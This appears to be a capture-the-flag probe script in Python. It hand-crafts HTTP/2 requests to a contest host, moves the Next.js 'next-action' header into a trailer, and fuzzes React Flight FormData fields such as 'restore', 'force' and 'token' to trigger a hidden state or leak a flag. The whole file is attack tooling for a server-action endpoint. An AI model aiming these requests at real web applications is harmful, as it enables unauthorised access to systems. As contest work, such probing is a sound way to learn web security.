#!/usr/bin/env python3
"""
probe32: React Flight FormData encoding via multipart.

probe31 finding: body=["$K1"] (text/plain JSON) → 200 (no exception).
$K1 is a React Flight reference to FormData reused from request body.
With text/plain there's no FormData → action gets empty/null.

To send a real FormData arg to action, use multipart/form-data:
- field "0" = `["$K1"]` (root model, args array)
- fields "1_<key>" = FormData entries (id=1 because $K1)

We iterate field names + values for FormData entries.
"""
import socket
import ssl
import struct
import time
import re
import hashlib
from hpack import Encoder

HOST = "funicular-gm2cxozn.alfactf.ru"
PORT = 443

with open("/tmp/funi.actionid") as f:
    ACTION_ID = f.read().strip()
print(f"# action_id = {ACTION_ID}")

PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"


def open_h2():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["h2"])
    raw = socket.create_connection((HOST, PORT), timeout=15)
    sock = ctx.wrap_socket(raw, server_hostname=HOST)
    sock.sendall(PREFACE)
    sock.sendall(b"\x00\x00\x00\x04\x00\x00\x00\x00\x00")
    return sock


def read_frames(sock, want_stream=1, max_time=12):
    sock.settimeout(max_time)
    buf = b""
    end = False
    out = []
    deadline = time.time() + max_time
    while not end and time.time() < deadline:
        try:
            chunk = sock.recv(65536)
        except (socket.timeout, OSError):
            break
        if not chunk:
            break
        buf += chunk
        while True:
            if len(buf) < 9:
                break
            length = int.from_bytes(buf[:3], "big")
            ftype = buf[3]
            flags = buf[4]
            sid = int.from_bytes(buf[5:9], "big") & 0x7fffffff
            if len(buf) < 9 + length:
                break
            payload = buf[9:9+length]
            buf = buf[9+length:]
            out.append((ftype, flags, sid, payload))
            if sid == want_stream and (ftype in (0, 1) and flags & 0x1):
                end = True
                break
    return out


def parse_response(frames):
    from hpack import Decoder
    dec = Decoder()
    status = None
    body = b""
    headers = []
    for ftype, flags, sid, payload in frames:
        if ftype == 1:
            data = payload
            if flags & 0x8:
                pad_len = data[0]
                data = data[1:-pad_len] if pad_len else data[1:]
            if flags & 0x20:
                data = data[5:]
            try:
                hdrs = dec.decode(data)
                headers.extend(hdrs)
                for k, v in hdrs:
                    sk = k.decode() if isinstance(k, bytes) else k
                    sv = v.decode() if isinstance(v, bytes) else v
                    if sk == ":status":
                        status = sv
            except Exception:
                pass
        elif ftype == 0:
            data = payload
            if flags & 0x8:
                pad_len = data[0]
                data = data[1:-pad_len] if pad_len else data[1:]
            body += data
    return status, headers, body


def call_action(body_bytes, content_type="text/plain;charset=UTF-8"):
    sid = 1
    enc = Encoder()
    headers = [
        (":method", "POST"),
        (":scheme", "https"),
        (":authority", HOST),
        (":path", "/"),
        ("accept", "text/x-component"),
        ("content-type", content_type),
        ("content-length", str(len(body_bytes))),
        ("trailer", "next-action"),
        ("user-agent", "p32"),
    ]
    head_block = enc.encode(headers)
    trailer_block = enc.encode([("next-action", ACTION_ID)])

    sock = open_h2()
    sock.settimeout(2)
    try:
        sock.recv(65536)
    except Exception:
        pass
    sock.settimeout(15)
    raw = struct.pack(">I", len(head_block))[1:] + b"\x01" + bytes([0x04]) + struct.pack(">I", sid) + head_block
    sock.sendall(raw)
    raw = struct.pack(">I", len(body_bytes))[1:] + b"\x00" + bytes([0x00]) + struct.pack(">I", sid) + body_bytes
    sock.sendall(raw)
    raw = struct.pack(">I", len(trailer_block))[1:] + b"\x01" + bytes([0x05]) + struct.pack(">I", sid) + trailer_block
    sock.sendall(raw)

    frames = read_frames(sock, want_stream=sid, max_time=12)
    sock.close()
    return parse_response(frames)


def diag(body):
    text = body.decode("utf-8", "replace")
    digest = re.search(r'"digest":"([^"]+)"', text)
    restored = '"restored":true' in text
    flag = re.search(r'alfa\{[^}]+\}', text)
    return {
        "digest": digest.group(1) if digest else None,
        "restored": restored,
        "flag": flag.group(0) if flag else None,
        "len": len(body),
        "text_excerpt": text[:200],
    }


def make_multipart(fields, boundary="----p32"):
    parts = []
    for name, value in fields:
        if isinstance(value, bytes):
            parts.append(f"--{boundary}\r\nContent-Disposition: form-data; name=\"{name}\"\r\n\r\n".encode())
            parts.append(value)
            parts.append(b"\r\n")
        else:
            parts.append(f"--{boundary}\r\nContent-Disposition: form-data; name=\"{name}\"\r\n\r\n{value}\r\n".encode())
    parts.append(f"--{boundary}--\r\n".encode())
    return f"multipart/form-data; boundary={boundary}", b"".join(parts)


def test(label, body, ct):
    try:
        st, hdr, b = call_action(body, ct)
    except Exception as e:
        print(f"[{label:50s}] EXC: {type(e).__name__}: {e}")
        return None
    d = diag(b)
    sha = hashlib.sha256(b).hexdigest()[:12]
    marker = ""
    if d["restored"]:
        marker = " <RESTORED!>"
    elif d["flag"]:
        marker = f" <FLAG: {d['flag']}>"
    elif d["digest"] is None and st in ("200", "303"):
        marker = " <NO-ERROR>"
    print(f"[{label:50s}] {st} len={d['len']:5d} sha={sha} digest={d['digest']} restored={d['restored']}{marker}")
    if marker and "RESTORED" in marker or "FLAG" in marker:
        print(f"    excerpt: {d['text_excerpt']!r}")
    return d


# Baseline: no FormData
print("\n## Baseline confirms no error path")
ct, body = make_multipart([("0", '["$K1"]')])
test("MP 0=['$K1']           (no 1_*)", body, ct)

# Try: empty FormData entries with various names — to see if any specific key triggers state
print("\n## Single FormData field combinations")
NAMES = [
    "packet", "workOrder", "terminal", "confirm", "code", "secret",
    "password", "pin", "restore", "restored", "force", "mode", "op",
    "operation", "action", "key", "token", "csrf", "consent",
    "from", "source", "snapshot", "manifest", "backup", "version",
]
for name in NAMES:
    ct, body = make_multipart([("0", '["$K1"]'), (f"1_{name}", "true")])
    test(f"MP 1_{name}=true", body, ct)

print("\n## Default-value FormData combinations")
# Maybe action checks defaults match
DEFAULTS = [
    [("1_packet", "south-line.2026-03-27"), ("1_workOrder", "WO-17-04"), ("1_terminal", "OP-3")],
    [("1_packet", "south-line.2026-03-27"), ("1_workOrder", "WO-17-04"), ("1_terminal", "ОП-3 / верхняя станция")],
    [("1_packet", "south-line.2026-03-27"), ("1_workOrder", "WO-17-04"), ("1_terminal", "ОП-3")],
    [("1_packet", "south-line.2026-03-27")],
    [("1_workOrder", "WO-17-04")],
    [("1_terminal", "ОП-3 / верхняя станция")],
    [("1_terminal", "OP-3")],
]
for fields in DEFAULTS:
    ct, body = make_multipart([("0", '["$K1"]')] + fields)
    field_repr = ",".join(f"{n}={v[:20]}" for n, v in fields)
    test(f"MP defaults: {field_repr[:50]}", body, ct)

print("\n## Confirm/restore + defaults together")
COMBINED = [
    [("1_packet", "south-line.2026-03-27"), ("1_workOrder", "WO-17-04"), ("1_terminal", "ОП-3 / верхняя станция"), ("1_confirm", "true")],
    [("1_packet", "south-line.2026-03-27"), ("1_confirm", "true")],
    [("1_confirm", "yes"), ("1_restore", "true")],
    [("1_action", "restore")],
    [("1_op", "restore")],
    [("1_mode", "restore"), ("1_force", "true")],
]
for fields in COMBINED:
    ct, body = make_multipart([("0", '["$K1"]')] + fields)
    field_repr = ",".join(f"{n}={v[:20]}" for n, v in fields)
    test(f"MP combo: {field_repr[:50]}", body, ct)

print("\n# done.")
